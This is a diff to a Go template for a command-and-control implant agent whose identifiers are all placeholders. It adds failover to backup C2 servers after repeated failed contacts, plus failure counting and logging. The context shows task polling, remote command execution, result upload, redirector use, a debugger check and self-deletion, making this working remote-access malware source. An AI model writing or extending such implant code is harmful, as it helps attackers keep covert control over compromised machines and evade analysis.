@@ -444,6 +444,12 @@ type {AGENT_STRUCT_NAME} struct {
 	{AGENT_REDIRECTOR_HOST_FIELD}       string
 	{AGENT_REDIRECTOR_PORT_FIELD}       int
 	{AGENT_USE_REDIRECTOR_FIELD}        bool
+	{AGENT_FAILOVER_URLS_FIELD}         []string
+	{AGENT_USE_FAILOVER_FIELD}          bool
+	{AGENT_CURRENT_C2_URL_FIELD}        string
+	{AGENT_CURRENT_FAIL_COUNT_FIELD}    int
+	{AGENT_MAX_FAIL_COUNT_FIELD}        int
+	{AGENT_LAST_CONNECTION_ATTEMPT_FIELD} time.Time
 }
 
 type {TASK_STRUCT_NAME} struct {
@@ -522,6 +528,12 @@ func New{AGENT_STRUCT_NAME}(agentID, secretKey, c2URL, redirectorHost string, re
 		{AGENT_REDIRECTOR_HOST_FIELD}:       redirectorHost,
 		{AGENT_REDIRECTOR_PORT_FIELD}:       redirectorPort,
 		{AGENT_USE_REDIRECTOR_FIELD}:        useRedirector,
+		{AGENT_FAILOVER_URLS_FIELD}:         {FAILOVER_URLS},
+		{AGENT_USE_FAILOVER_FIELD}:          {USE_FAILOVER},
+		{AGENT_CURRENT_C2_URL_FIELD}:        c2URL,
+		{AGENT_CURRENT_FAIL_COUNT_FIELD}:    0,
+		{AGENT_MAX_FAIL_COUNT_FIELD}:        15,  // Try main C2 for ~15 * heartbeat_interval before failover
+		{AGENT_LAST_CONNECTION_ATTEMPT_FIELD}: time.Now(),
 	}
 
 	return agent, nil
@@ -571,12 +583,12 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_SEND_FUNC}(method, uriTemplate string, data
 	var url string
 	if a.{AGENT_USE_REDIRECTOR_FIELD} {
 		protocol := "http"
-		if strings.HasPrefix(a.{AGENT_C2_URL_FIELD}, "https") {
+		if strings.HasPrefix(a.{AGENT_CURRENT_C2_URL_FIELD}, "https") {
 			protocol = "https"
 		}
 		url = fmt.Sprintf("%s://%s:%d%s", protocol, a.{AGENT_REDIRECTOR_HOST_FIELD}, a.{AGENT_REDIRECTOR_PORT_FIELD}, uri)
 	} else {
-		url = a.{AGENT_C2_URL_FIELD} + uri
+		url = a.{AGENT_CURRENT_C2_URL_FIELD} + uri
 	}
 
 	tr := &http.Transport{
@@ -1350,7 +1362,11 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {
 
 		err := a.{AGENT_REGISTER_FUNC}()
 		if err == nil {
+			a.{AGENT_RESET_FAIL_COUNT_FUNC}()
 			break
+		} else {
+			fmt.Printf("[-] Registration failed: %v\n", err)
+			a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
 		}
 		time.Sleep(30 * time.Second)
 	}
@@ -1383,14 +1399,19 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {
 					a.{AGENT_INTERACTIVE_MODE_FIELD} = false
 				}
 			} else {
+				fmt.Printf("[-] Failed to check interactive status: %v\n", err)
 			}
 		}
 
 		if !a.{AGENT_INTERACTIVE_MODE_FIELD} {
 			tasks, err := a.{AGENT_GET_TASKS_FUNC}()
 			if err != nil {
+				fmt.Printf("[-] Failed to get tasks: %v\n", err)
+				a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
 				time.Sleep(30 * time.Second)
 				continue
+			} else {
+				a.{AGENT_RESET_FAIL_COUNT_FUNC}()  // Reset on successful communication
 			}
 
 
@@ -1399,20 +1420,29 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {
 				taskIDStr := strconv.FormatInt(task.{TASK_ID_FIELD}, 10)
 				err := a.{AGENT_SUBMIT_TASK_RESULT_FUNC}(taskIDStr, result)
 				if err != nil {
+					fmt.Printf("[-] Failed to submit task result: %v\n", err)
+					a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
 				} else {
+					a.{AGENT_RESET_FAIL_COUNT_FUNC}()  // Reset on successful result submission
 				}
 			}
 		} else {
 			interactiveTask, err := a.{AGENT_GET_INTERACTIVE_COMMAND_FUNC}()
 			if err != nil {
+				fmt.Printf("[-] Failed to get interactive command: %v\n", err)
+				a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
 			} else if interactiveTask != nil {
 				result := a.{AGENT_PROCESS_COMMAND_FUNC}(interactiveTask.{TASK_COMMAND_FIELD})
 				taskIDStr := strconv.FormatInt(interactiveTask.{TASK_ID_FIELD}, 10)
 				err := a.{AGENT_SUBMIT_INTERACTIVE_RESULT_FUNC}(taskIDStr, result)
 				if err != nil {
+					fmt.Printf("[-] Failed to submit interactive result: %v\n", err)
+					a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
 				} else {
+					a.{AGENT_RESET_FAIL_COUNT_FUNC}()  // Reset on successful result submission
 				}
 			} else {
+				a.{AGENT_RESET_FAIL_COUNT_FUNC}()  // Reset when no task but no error
 			}
 		}
 
@@ -1826,6 +1856,55 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_WINDOWS_DEBUGGER_FUNC}() bool {
 	}
 
 	return false
+}
+
+func (a *{AGENT_STRUCT_NAME}) {AGENT_TRY_FAILOVER_FUNC}() bool {
+	if !a.{AGENT_USE_FAILOVER_FIELD} || len(a.{AGENT_FAILOVER_URLS_FIELD}) == 0 {
+		return false
+	}
+
+	// Check if we should try failover based on failure count
+	if a.{AGENT_CURRENT_FAIL_COUNT_FIELD} < a.{AGENT_MAX_FAIL_COUNT_FIELD} {
+		return false
+	}
+
+	// Try to register with a failover C2
+	originalC2URL := a.{AGENT_CURRENT_C2_URL_FIELD}
+	for _, failoverURL := range a.{AGENT_FAILOVER_URLS_FIELD} {
+		a.{AGENT_CURRENT_C2_URL_FIELD} = failoverURL
+
+		// Try to register with the failover server
+		err := a.{AGENT_REGISTER_FUNC}()
+		if err == nil {
+			fmt.Printf("[+] Successfully connected to failover C2: %s\n", failoverURL)
+			a.{AGENT_CURRENT_FAIL_COUNT_FIELD} = 0  // Reset failure count
+			a.{AGENT_LAST_CONNECTION_ATTEMPT_FIELD} = time.Now()
+			return true
+		} else {
+			// If registration failed, try the next failover URL
+			fmt.Printf("[-] Failed to connect to failover C2: %s, error: %v\n", failoverURL, err)
+			// Continue to the next URL
+		}
+	}
+
+	// If all failover attempts failed, return to the original main C2
+	a.{AGENT_CURRENT_C2_URL_FIELD} = originalC2URL
+	a.{AGENT_LAST_CONNECTION_ATTEMPT_FIELD} = time.Now()
+	return false
+}
+
+func (a *{AGENT_STRUCT_NAME}) {AGENT_INCREMENT_FAIL_COUNT_FUNC}() {
+	a.{AGENT_CURRENT_FAIL_COUNT_FIELD}++
+	a.{AGENT_LAST_CONNECTION_ATTEMPT_FIELD} = time.Now()
+
+	// If we haven't reached the maximum fail count, try failover
+	if a.{AGENT_CURRENT_FAIL_COUNT_FIELD} >= a.{AGENT_MAX_FAIL_COUNT_FIELD} {
+		a.{AGENT_TRY_FAILOVER_FUNC}()
+	}
+}
+
+func (a *{AGENT_STRUCT_NAME}) {AGENT_RESET_FAIL_COUNT_FUNC}() {
+	a.{AGENT_CURRENT_FAIL_COUNT_FIELD} = 0
 }
 
 func (a *{AGENT_STRUCT_NAME}) {AGENT_SELF_DELETE_FUNC}() {
